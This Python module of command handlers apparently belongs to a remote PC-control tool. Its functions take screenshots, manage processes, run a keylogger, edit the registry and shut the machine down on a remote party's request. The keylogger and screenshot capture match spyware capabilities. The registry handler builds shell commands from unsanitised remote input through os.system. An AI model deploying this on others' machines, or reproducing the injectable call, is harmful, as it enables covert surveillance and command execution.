import Keylogger
import ProcessRunning

import base64
import io
import pyautogui
import os
import subprocess


def action_screenshot(option, data):
    error_code = 0

    img = pyautogui.screenshot()
    b = io.BytesIO()
    img.save(b, format='PNG')
    server_data = base64.b64encode(b.getvalue()).decode('utf-8')

    return (error_code, server_data)

def action_process(option, data):
    error_code = 0
    server_data = ''

    if option == 'list':
        server_data = ProcessRunning.get_running_process()
    elif option == 'start':
        error_code = 0 if ProcessRunning.start(data) else 203
    else:
        r = ProcessRunning.kill(data)
        error_code = 0 if r == 0 else 200 if r == 1 else 201 if r == 2 else 202

    return (error_code, server_data)

def action_app(option, data):
    error_code = 0
    server_data = ''

    if option == 'list':
        server_data = ProcessRunning.get_running_applications()
    elif option == 'start':
        error_code = 0 if ProcessRunning.start(data) else 303
    else:
        r = ProcessRunning.kill(data)
        error_code = 0 if r == 0 else 300 if r == 1 else 301 if r == 2 else 302
    return (error_code, server_data)

# Global variable
keylogger = Keylogger.Keylogger()
def action_keylogging(option, data):
    error_code = 0
    server_data = ''

    if option == 'hook':
        keylogger.hook()
    elif option == 'unhook':
        server_data = keylogger.unhook()

    return (error_code, server_data)


def action_reg(option, data):
    """
    Parameters
    ---------
    option : str
        One of the five command: 'send', 'get', 'set', 'delete', 'create-key', 'delete-key'

    data : str
        Depends on option:
            option = 'send':       the .reg file
            option = 'get':        the path of the key to get value
            option = 'set':        a formatted string: <path to key>,<new value>,<value type>
            option = 'delete':     the path to the key to delete value
            option = 'create-key': the path to the new key to create
            option = 'delete-key': the path to the key to delete
    
    Returns
    -------
    error_code : int
    
    server_data : str
        If error_code == 0: server_data is empty
        Else depends on option:
            option = 'send':       empty
            option = 'get':        <value data>
            option = 'set':        empty
            option = 'delete':     empty
            option = 'create-key': empty
            option = 'delete-key': empty
    type of value in key: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/25cce700-7fcf-4bb6-a2f3-0f6d08430a55
    """
    dataDictType = {
        'String':'REG_SZ',
        'Multi-String':'REG_MULTI_SZ',
        'DWORD':'REG_DWORD',
        'QWORD':'REG_QWORD',
        'Binary':'REG_BINARY',
        'Expandable String':'REG_EXPAND_SZ'
    }
    error_code = 0
    server_data = ''
    
    command = ''
    if option == 'send':
        print(option)
        nameTempRegFile = 'recv.reg'
        print(data)
        file = open(nameTempRegFile,'w')
        file.write(data)
        file.close()
        command = ['reg', 'import', nameTempRegFile]
    else:
        key, value, data_type, data = tuple(data.split(',', 3))

        if option == 'get':
            command = ['reg', 'query', key, '/v', value]
            try:
                server_data = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                server_data = server_data.decode().split()[-1].split('\\')[0]
                return (error_code, server_data)
            except subprocess.CalledProcessError:
                error_code = 400
            
        elif option == 'set':
            command = ['reg', 'add', key, '/v', value, '/t', dataDictType[data_type], '/d', data, '/f']
        elif option == 'delete':
            command = ['reg', 'delete', key, '/v', value, '/f']
        elif option == 'create-key':
            command = ['reg', 'add', key, '/f']
        else:
            # option == 'delete-key':
            command = ['reg', 'delete', key, '/f']

    command = ' '.join(command)
    error_code = 0 if os.system(command) == 0 else 400

    return (error_code, server_data)

def action_shutdown(option, data):
    error_code = 0
    server_data = ''

    error_code = 0 if os.system('shutdown /s /t 5') == 0 else 500

    return (error_code, server_data)
